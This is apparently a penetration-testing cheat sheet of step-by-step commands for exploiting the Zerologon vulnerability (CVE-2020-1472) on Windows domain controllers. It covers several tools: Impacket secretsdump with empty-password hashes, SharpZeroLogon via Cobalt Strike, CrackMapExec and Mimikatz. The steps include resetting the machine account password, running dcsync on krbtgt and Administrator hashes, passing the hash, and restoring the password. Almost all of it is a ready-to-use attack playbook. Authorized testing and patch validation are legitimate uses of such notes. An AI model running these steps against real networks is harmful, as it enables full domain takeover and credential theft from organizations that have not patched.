## CVE-2020-1472 Zerologon

#### As the name implies, if the machine is vulnerable to Zerologon, it can reset the administrator credentials to an empty string, then attempt to dump the hashes via secretsdump without having to use a password.

### Tools: Impacket-secretsdump, https://github.com/risksense/zerologon, https://github.com/SecuraBV/CVE-2020-1472

#### 1) python3 set_empty_pw.py NETBIOS_NAME DC_IP 

#### 2) If attempt was successful, then: impacket-secretsdump -just-dc -no-pass DOMAIN.LOCAL/NETBIOS_NAME\$DC_IP

#### impacket-secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'

#### 3) When you dump the domain admin hash, you can use it to Pass-the-Hash via evil-winrm or attempt to crack it offline with hashcat

#### 4) At login, copy the SAM and SYSTEM hives to your local machine, then dump them offline (Alternative to secretsdump)

#### 5) python3 reinstall_original_pw.py NETBIOS_NAME DC_IP ORIGINAL_NTLM_ADMIN_HASH (Reinstalls the original password that the admin had to prevent permanent damage on the machine)

### TIP: The LM and NTLM hashes represented in the command are actually the hashed version of empty password/string

## Alternate Method: nccfsas - .NET binary for Cobalt Strike's execute-assembly

### Tools: https://github.com/nccgroup/nccfsas

### Steps:

#### 1) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL (Check)

#### 2) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL -reset (Reset the machine account password)

#### 3) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL -patch (Reset the password back)

## Alternate Method: CrackMapExec (Only check)

#### 1) crackmapexec smb DC_IP -u USERNAME -p PASSWORD -d DOMAIN -M zerologon

## Alternate Method: Mimikatz - 2.2.0 20200917 Post-Zerologon

### Steps:

#### 1) privilege::Debug

#### 2) lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ (Check for CVE)

#### 3) lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit (Exploit the CVE and set the computer account's password to "")

#### 4) lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ 

#### lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ (Execute dcsync to extract some hashes)

#### 5) sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN (Pass The Hash with the extracted Domain Admin hash)

#### 6) lsadump::postzerologon /target:DC_IP /account:DC01$ (Reset password. Use IP address instead of FQDN to force NTLM with Windows APIs)
